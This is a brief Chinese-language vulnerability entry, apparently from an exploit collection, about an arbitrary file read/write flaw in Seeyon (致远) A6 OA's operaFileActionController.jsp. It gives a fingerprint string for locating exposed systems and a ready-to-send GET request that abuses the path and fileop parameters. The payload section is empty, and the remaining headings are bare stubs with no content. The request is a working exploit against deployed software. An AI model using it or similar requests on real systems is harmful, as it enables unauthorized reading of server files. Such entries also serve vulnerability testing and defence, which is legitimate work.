# 致远A6operaFileActionController.jsp任意文件读取漏洞

- **系统**：致远OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body="seeyonDownLoadPic"`
- **请求**：`GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=29C63936899FE48A5DDB5A0694A384F4`

**请求体 / payload**
```

```

**其他**
- 致远 A6 operaFileActionController.jsp 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远A6